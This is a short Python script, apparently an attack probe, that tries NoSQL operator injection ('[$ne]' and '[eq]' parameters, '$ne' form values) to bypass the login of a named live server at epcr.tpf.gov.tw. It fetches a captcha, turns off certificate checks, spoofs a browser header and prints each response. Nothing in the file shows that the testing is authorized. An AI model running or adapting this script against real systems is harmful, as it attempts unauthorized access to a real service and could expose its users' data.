import requests, json, urllib3
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"

print("=== JQLike query-string 形式登录测试 ===")
# services.js 用 $httpParamSerializerJQLike -> /login 可能也接受 query 形式
tests=[
  ("query", "/login?username[$ne]=&password[$ne]=&captcha=1&domain=AUTH_SERVER", None),
  ("query-eq", "/login?username[eq]=admin&password[eq]=x&captcha=1&domain=AUTH_SERVER", None),
  ("form", "/login", "username=$ne&password=$ne&captcha=1&domain=AUTH_SERVER"),
  ("form-ne", "/login", "username=admin&password=x&captcha=1&domain=AUTH_SERVER"),
]
for name, path, body in tests:
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    try:
        if body and "form" in name:
            r=s.post(BASE+path, data=body, headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
        else:
            r=s.get(BASE+path, timeout=10)
        print(f"  {name:10s} {path[:55]:55s} -> {r.status_code} {r.text[:60]}")
    except Exception as e:
        print(f"  {name:10s} -> ERR {repr(e)[:40]}")

print("\n=== form-urlencoded NoSQL (username 对象) ===")
# form 不支持对象, 测试 username= 空 或特殊
for ubody in [
  "username=&password=&captcha=1&domain=AUTH_SERVER",
  "username=%24ne&password=%24ne&captcha=1&domain=AUTH_SERVER",
]:
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    try:
        r=s.post(BASE+"/login", data=ubody, headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
        print(f"  form {ubody[:50]:50s} -> {r.status_code} {r.text[:60]}")
    except Exception as e:
        print(f"  form -> ERR {repr(e)[:40]}")
print("DONE")
